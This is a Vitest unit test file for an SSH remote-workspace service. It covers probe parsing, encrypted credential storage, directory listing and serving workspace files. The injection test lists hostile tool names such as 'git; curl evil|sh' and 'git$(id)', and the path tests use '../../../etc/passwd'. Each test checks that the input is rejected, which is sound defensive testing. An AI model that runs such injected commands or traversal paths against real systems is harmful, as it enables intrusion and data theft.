import { describe, expect, it, vi } from "vitest";
import { EventEmitter } from "node:events";
import { promises as fs } from "node:fs";
import os from "node:os";
import path from "node:path";
import { PassThrough, Readable } from "node:stream";
import {
	expandHome,
	RemoteSshService,
	resolveRemoteWorkspacePath,
	serveRemoteWorkspaceFile,
	setGlobalRemoteSshService,
} from "../../server/remote-ssh-service.js";
import { probePresentItem } from "../../server/present-files-tool.js";

describe("RemoteSshService", () => {
	it("expandHome correctly expands home directory", () => {
		expect(expandHome(undefined)).toBeUndefined();
		expect(expandHome("")).toBe("");
		expect(expandHome("~")).toBe(os.homedir());
		expect(expandHome("~/foo/bar")).toBe(path.join(os.homedir(), "foo/bar"));
		expect(expandHome("/var/log")).toBe("/var/log");
	});

	it("parseProbeOutput parses full system and tools", () => {
		const svc = new RemoteSshService(os.tmpdir());
		const mockOutput = `
===SYSTEM===
Linux
x86_64
my-ubuntu-server
ubuntu
/home/ubuntu
===GIT===
/usr/bin/git
git version 2.34.1
===NODE===
/usr/bin/node
v20.11.0
===BASH===
/bin/bash
GNU bash, version 5.1.16(1)-release (x86_64-pc-linux-gnu)
===PYTHON===
/usr/bin/python3
Python 3.10.12
===PKG===
apt-get
`;

		// @ts-expect-error accessing private method for unit testing
		const parsed = svc.parseProbeOutput(mockOutput);

		expect(parsed.system.os).toBe("Linux");
		expect(parsed.system.arch).toBe("x86_64");
		expect(parsed.system.hostname).toBe("my-ubuntu-server");
		expect(parsed.system.user).toBe("ubuntu");
		expect(parsed.system.homeDir).toBe("/home/ubuntu");

		expect(parsed.tools.git.installed).toBe(true);
		expect(parsed.tools.git.version).toContain("git version 2.34.1");

		expect(parsed.tools.node.installed).toBe(true);
		expect(parsed.tools.node.version).toContain("v20.11.0");

		expect(parsed.tools.bash.installed).toBe(true);
		expect(parsed.tools.bash.path).toBe("/bin/bash");

		expect(parsed.packageManager).toBe("apt-get");
		expect(parsed.suggestedInstall).toEqual([]);
	});

	it("parseProbeOutput detects missing git and bash and suggests installation", () => {
		const svc = new RemoteSshService(os.tmpdir());
		const mockOutput = `
===SYSTEM===
Linux
aarch64
minimal-alpine
root
/root
===GIT===
NONE
===NODE===
NONE
===BASH===
NONE
===PYTHON===
NONE
===PKG===
apk
`;

		// @ts-expect-error accessing private method for unit testing
		const parsed = svc.parseProbeOutput(mockOutput);

		expect(parsed.system.os).toBe("Linux");
		expect(parsed.system.arch).toBe("aarch64");
		expect(parsed.tools.git.installed).toBe(false);
		expect(parsed.tools.node.installed).toBe(false);
		expect(parsed.tools.bash.installed).toBe(false);
		expect(parsed.packageManager).toBe("apk");
		expect(parsed.suggestedInstall).toContain("git");
		expect(parsed.suggestedInstall).toContain("bash");
	});

	it("saves and manages profiles securely without leaking plaintext credentials", async () => {
		const testDataDir = path.join(os.tmpdir(), `pi-web-ssh-test-${Date.now()}-${Math.random().toString(36).slice(2)}`);
		await fs.mkdir(testDataDir, { recursive: true });

		try {
			const svc = new RemoteSshService(testDataDir);

			await svc.saveProfile("test-server", {
				host: "1.2.3.4",
				port: 2222,
				username: "developer",
				auth: {
					type: "password",
					password: "super-secret-password-12345",
				},
			});

			const profiles = await svc.listProfiles();
			expect(profiles).toHaveLength(1);
			expect(profiles[0].name).toBe("test-server");
			expect(profiles[0].host).toBe("1.2.3.4");
			expect(profiles[0].port).toBe(2222);
			expect(profiles[0].username).toBe("developer");
			expect(profiles[0].authType).toBe("password");
			expect((profiles[0] as any).password).toBeUndefined();

			const diskRaw = await fs.readFile(path.join(testDataDir, "global-hosts.json"), "utf8");
			expect(diskRaw).not.toContain("super-secret-password-12345");
			expect(diskRaw).toContain("encryptedPassword");

			await svc.deleteProfile("test-server");
			const profilesAfter = await svc.listProfiles();
			expect(profilesAfter).toHaveLength(0);
		} finally {
			await fs.rm(testDataDir, { recursive: true, force: true }).catch(() => {});
		}
	});

	it("旧 ssh-profiles.json 自动无损迁移至 global-hosts.json", async () => {
		const testDataDir = path.join(
			os.tmpdir(),
			`remote-ssh-migrate-${Date.now()}-${Math.random().toString(36).slice(2)}`,
		);
		await fs.mkdir(testDataDir, { recursive: true });
		try {
			const legacyContent = {
				version: 1,
				profiles: {
					"legacy-host": {
						name: "legacy-host",
						host: "10.0.0.1",
						port: 22,
						username: "root",
						authType: "key",
						privateKeyPath: "~/.ssh/id_rsa",
						lastConnected: 1000,
					},
				},
			};
			await fs.writeFile(path.join(testDataDir, "ssh-profiles.json"), JSON.stringify(legacyContent, null, 2), "utf8");

			const svc = new RemoteSshService(testDataDir);
			const profiles = await svc.listProfiles();
			expect(profiles).toHaveLength(1);
			expect(profiles[0].name).toBe("legacy-host");

			const migratedRaw = await fs.readFile(path.join(testDataDir, "global-hosts.json"), "utf8");
			expect(migratedRaw).toContain("legacy-host");
		} finally {
			await fs.rm(testDataDir, { recursive: true, force: true }).catch(() => {});
		}
	});
});

describe("installTools 工具名注入防护（0.103 审计）", () => {
	it("shell 元字符直接拒绝，不触达连接与远端 shell", async () => {
		const svc = new RemoteSshService(os.tmpdir());
		for (const bad of ["git; curl evil|sh", "git$(id)", "git`id`", "git & reboot", "../../etc", "git\ncurl"]) {
			const r = await svc.installTools("no-such-connection", [bad]);
			expect(r.ok).toBe(false);
			expect(r.error).toContain("非法的工具名");
		}
	});

	it("合法工具名放行到连接层（未知连接按原样抛连接错误）", async () => {
		const svc = new RemoteSshService(os.tmpdir());
		await expect(svc.installTools("no-such-connection", ["git"])).rejects.toThrowError("连接已断开或不存在");
	});
});

describe("listDir 软链接目录识别与 ~ 路径展开", () => {
	it("跟随符号链接判断目录并展开 ~/ 路径", async () => {
		const svc = new RemoteSshService(os.tmpdir());
		const mockSftp = {
			readdir: (targetPath: string, cb: (err: Error | null, list?: any[]) => void) => {
				expect(targetPath).toBe("/home/k");
				cb(null, [
					{
						filename: "data",
						attrs: {
							isDirectory: () => false,
							isSymbolicLink: () => true,
							size: 12,
							mtime: 1700000000,
						},
					},
					{
						filename: "broken-link",
						attrs: {
							isDirectory: () => false,
							isSymbolicLink: () => true,
							size: 8,
							mtime: 1700000000,
						},
					},
					{
						filename: "readme.md",
						attrs: {
							isDirectory: () => false,
							isSymbolicLink: () => false,
							size: 100,
							mtime: 1700000000,
						},
					},
				]);
			},
			stat: (fullPath: string, cb: (err: Error | null, stats?: any) => void) => {
				if (fullPath === "/home/k/data") {
					cb(null, { isDirectory: () => true, isFile: () => false });
				} else {
					cb(new Error("No such file"));
				}
			},
		};

		// @ts-expect-error testing internal connection map
		svc.connections.set("conn-1", {
			id: "conn-1",
			hostKey: "k@pro6000d:22",
			client: {} as any,
			sftp: mockSftp as any,
			params: { host: "pro6000d", port: 22, username: "k", auth: { type: "key" } },
			system: { os: "Linux", arch: "x86_64", hostname: "k", user: "k", homeDir: "/home/k" },
			alive: true,
			timer: setTimeout(() => {}, 60000),
		});

		const res = await svc.listDir("conn-1", "~");
		// @ts-expect-error cleanup timer
		clearTimeout(svc.connections.get("conn-1")?.timer);

		expect(res.ok).toBe(true);
		expect(res.path).toBe("/home/k");
		const dataItem = res.items.find((i) => i.name === "data");
		expect(dataItem?.type).toBe("dir");
		expect(dataItem?.path).toBe("/home/k/data");

		const brokenItem = res.items.find((i) => i.name === "broken-link");
		expect(brokenItem?.type).toBe("file");
	});
});

describe("serveRemoteWorkspaceFile 与 present_files 远程工作区支持", () => {
	function createMockRes() {
		const pt = new PassThrough();
		const chunks: Buffer[] = [];
		pt.on("data", (c) => chunks.push(Buffer.from(c)));
		let statusCode = 200;
		const headers: Record<string, string> = {};
		let endedBody = "";
		const origEnd = pt.end.bind(pt);
		(pt as any).status = (code: number) => {
			statusCode = code;
			return pt;
		};
		(pt as any).setHeader = (k: string, v: string) => {
			headers[k.toLowerCase()] = v;
		};
		(pt as any).type = (_name: string) => {};
		(pt as any).end = (chunk?: any) => {
			if (typeof chunk === "string") endedBody = chunk;
			else if (Buffer.isBuffer(chunk)) chunks.push(chunk);
			return origEnd(chunk);
		};
		return {
			res: pt as any,
			getStatus: () => statusCode,
			getHeaders: () => headers,
			getBody: () => (chunks.length > 0 ? Buffer.concat(chunks).toString("utf8") : endedBody),
		};
	}

	it("支持远程工作区文件 HTTP 下载（相对路径与绝对路径）并拦截越界路径", async () => {
		const remoteUri = "ssh://k@pro6000d:22/data/spare/project";
		const fileContent = "# Benchmark Report\nAll tests passed!";
		const mockSvc = {
			sftpStat: async (_uri: string, remoteAbs: string) => {
				if (remoteAbs === "/data/spare/project/report.md" || remoteAbs === "/data/models/config.json") {
					return { isDirectory: false, isFile: true, size: Buffer.byteLength(fileContent), mtime: 1700000000000 };
				}
				throw new Error("ENOENT");
			},
			sftpCreateReadStream: async (_uri: string, _remoteAbs: string, opts?: { start?: number; end?: number }) => {
				const buf = Buffer.from(fileContent, "utf8");
				const slice =
					opts?.start !== undefined || opts?.end !== undefined
						? buf.subarray(opts?.start ?? 0, opts?.end !== undefined ? opts.end + 1 : undefined)
						: buf;
				return Readable.from(slice);
			},
			sftpReadFile: async (_uri: string, _remoteAbs: string, maxBytes?: number) => {
				const buf = Buffer.from(fileContent, "utf8");
				return { data: maxBytes ? buf.subarray(0, maxBytes) : buf, size: buf.length };
			},
		} as unknown as RemoteSshService;

		const m1 = createMockRes();
		await serveRemoteWorkspaceFile(
			{ headers: {}, query: { download: "1" } },
			m1.res,
			remoteUri,
			"report.md",
			{ isDownload: true, allowAllTypes: false },
			mockSvc,
		);
		expect(m1.getStatus()).toBe(200);
		expect(m1.getHeaders()["content-disposition"]).toContain("report.md");
		expect(m1.getBody()).toBe(fileContent);

		const m2 = createMockRes();
		await serveRemoteWorkspaceFile(
			{ headers: {}, query: { download: "1" } },
			m2.res,
			remoteUri,
			"/data/models/config.json",
			{ isDownload: true, allowAllTypes: false },
			mockSvc,
		);
		expect(m2.getStatus()).toBe(200);
		expect(m2.getHeaders()["content-disposition"]).toContain("config.json");
		expect(m2.getBody()).toBe(fileContent);

		const m3 = createMockRes();
		await serveRemoteWorkspaceFile(
			{ headers: {}, query: { download: "1" } },
			m3.res,
			remoteUri,
			"../../../etc/passwd",
			{ isDownload: true, allowAllTypes: false },
			mockSvc,
		);
		expect(m3.getStatus()).toBe(400);
		expect(m3.getBody()).toBe("path outside workspace");

		setGlobalRemoteSshService(mockSvc);
		try {
			const item = await probePresentItem({ path: "report.md" }, remoteUri, { left: 1000 });
			expect(item.kind).toBe("markdown");
			expect(item.abs).toBe("/data/spare/project/report.md");
			expect(item.excerpt).toContain("Benchmark Report");
		} finally {
			setGlobalRemoteSshService(null as any);
		}
	});

	it("resolveRemoteWorkspacePath unwraps ssh:// URIs cleanly without nested prefixes", () => {
		const root = "/root/workspace/ljz";
		const res1 = resolveRemoteWorkspacePath(root, "ssh://root@203.0.113.10:22/root/workspace/ljz");
		expect(res1).toEqual({ abs: "/root/workspace/ljz", rel: "" });

		const res2 = resolveRemoteWorkspacePath(root, "ssh://root@203.0.113.10:22/root/workspace/ljz/subfolder");
		expect(res2).toEqual({ abs: "/root/workspace/ljz/subfolder", rel: "subfolder" });

		const res3 = resolveRemoteWorkspacePath(root, "nested/file.txt");
		expect(res3).toEqual({ abs: "/root/workspace/ljz/nested/file.txt", rel: "nested/file.txt" });

		expect(resolveRemoteWorkspacePath(root, "")).toEqual({ abs: "/root/workspace/ljz", rel: "" });
		expect(resolveRemoteWorkspacePath(root, ".")).toEqual({ abs: "/root/workspace/ljz", rel: "" });

		const resOutside = resolveRemoteWorkspacePath(root, "ssh://root@203.0.113.10:22/etc/passwd");
		expect(resOutside).toBeNull();
	});
});

describe("probe 活跃连接复用与 CPU/内存指标解析", () => {
	it("parseProbeOutput 应正确提取 cores 与 totalMemMb", () => {
		const svc = new RemoteSshService(os.tmpdir());
		const mockOutput = `
===SYSTEM===
Linux
x86_64
prod-server-01
root
/root
8
16384
===GIT===
/usr/bin/git
git version 2.34.1
===NODE===
/usr/local/bin/node
v20.10.0
===BASH===
/bin/bash
===PYTHON===
/usr/bin/python3
Python 3.10.12
===PKG===
apt-get
`;
		// @ts-expect-error testing private parseProbeOutput
		const parsed = svc.parseProbeOutput(mockOutput);
		expect(parsed.system.os).toBe("Linux");
		expect(parsed.system.arch).toBe("x86_64");
		expect(parsed.system.cores).toBe(8);
		expect(parsed.system.totalMemMb).toBe(16384);
		expect(parsed.tools.git.installed).toBe(true);
		expect(parsed.tools.node.installed).toBe(true);
	});

	it("probe 在已有存活连接时应直接复用，不重复握手", async () => {
		const svc = new RemoteSshService(os.tmpdir());
		let createClientCalled = false;
		// @ts-expect-error override private method for testing
		svc.createClient = async () => {
			createClientCalled = true;
			throw new Error("不应调用 createClient");
		};

		let execCommandCalled = false;
		// @ts-expect-error override private method for testing
		svc.execCommand = async () => {
			execCommandCalled = true;
			return `===SYSTEM===\nLinux\nx86_64\nhost\nroot\n/root\n4\n8192\n===GIT===\nNONE\n===NODE===\nNONE\n===BASH===\nNONE\n===PYTHON===\nNONE\n===PKG===\napt-get\n`;
		};

		const fakeConn = {
			id: "conn-active-1",
			hostKey: "root@192.168.1.100:22",
			alive: true,
			client: {} as any,
			params: {
				host: "192.168.1.100",
				port: 22,
				username: "root",
				auth: { type: "password" as const, password: "secret" },
			},
			timer: setTimeout(() => {}, 10000),
		};
		// @ts-expect-error testing private map
		svc.connections.set("conn-active-1", fakeConn);
		// @ts-expect-error testing private map
		svc.hostConnections.set("root@192.168.1.100:22", "conn-active-1");

		const res = await svc.probe({
			host: "192.168.1.100",
			port: 22,
			username: "root",
			auth: { type: "password" },
			saveProfile: false,
		});

		clearTimeout(fakeConn.timer);

		expect(createClientCalled).toBe(false);
		expect(execCommandCalled).toBe(true);
		expect(res.ok).toBe(true);
		expect(res.system?.cores).toBe(4);
		expect(res.system?.totalMemMb).toBe(8192);
	});
});

describe("pooled probe/install exec leases", () => {
	it("protects active exec from idle reclamation and releases after completion or synchronous failure", async () => {
		const dir = await fs.mkdtemp(path.join(process.platform === "win32" ? "E:/tmp" : os.tmpdir(), "remote-ssh-lease-"));
		vi.useFakeTimers();
		const service = new RemoteSshService(dir);
		const channel = Object.assign(new EventEmitter(), { stderr: new EventEmitter(), close: vi.fn() });
		let callback: any;
		const client = Object.assign(new EventEmitter(), {
			exec: vi.fn((_command, cb) => {
				callback = cb;
			}),
			end: vi.fn(),
		});
		const conn = (service as any).registerConnection(client, {
			host: "mock.test",
			username: "tester",
			auth: { type: "agent" },
		});
		try {
			const result = (service as any).execCommand(client, "long operation", 0);
			callback(null, channel);
			await vi.advanceTimersByTimeAsync(31 * 60_000);
			expect(client.end).not.toHaveBeenCalled();
			channel.emit("data", Buffer.from("done"));
			channel.emit("close", 0);
			await expect(result).resolves.toBe("done");
			expect(conn.activeOperations).toBe(0);
			client.exec.mockImplementation(() => {
				throw new Error("cannot exec");
			});
			await expect((service as any).execCommand(client, "fail")).rejects.toThrow("cannot exec");
			expect(conn.activeOperations).toBe(0);
			await vi.advanceTimersByTimeAsync(30 * 60_000);
			expect(client.end).toHaveBeenCalledOnce();
		} finally {
			service.closeConnection(conn.id);
			vi.useRealTimers();
			await fs.rm(dir, { recursive: true, force: true });
		}
	});
	it("times out only its exec channel and releases on connection errors", async () => {
		const dir = await fs.mkdtemp(path.join(process.platform === "win32" ? "E:/tmp" : os.tmpdir(), "remote-ssh-lease-"));
		vi.useFakeTimers();
		const service = new RemoteSshService(dir);
		const channel = Object.assign(new EventEmitter(), { stderr: new EventEmitter(), close: vi.fn() });
		const client = Object.assign(new EventEmitter(), {
			exec: vi.fn((_command, cb) => {
				cb(null, channel);
			}),
			end: vi.fn(),
		});
		const conn = (service as any).registerConnection(client, {
			host: "mock.test",
			username: "tester",
			auth: { type: "agent" },
		});
		try {
			const timed = (service as any).execCommand(client, "wait", 10);
			const rejected = expect(timed).rejects.toThrow("timed out");
			await vi.advanceTimersByTimeAsync(10);
			await rejected;
			expect(channel.close).toHaveBeenCalledOnce();
			expect(client.end).not.toHaveBeenCalled();
			expect(conn.activeOperations).toBe(0);
			const errored = (service as any).execCommand(client, "wait", 0);
			const disconnected = expect(errored).rejects.toThrow("connection lost");
			client.emit("error", new Error("lost"));
			await disconnected;
			expect(conn.activeOperations).toBe(0);
		} finally {
			service.closeConnection(conn.id);
			vi.useRealTimers();
			await fs.rm(dir, { recursive: true, force: true });
		}
	});
});
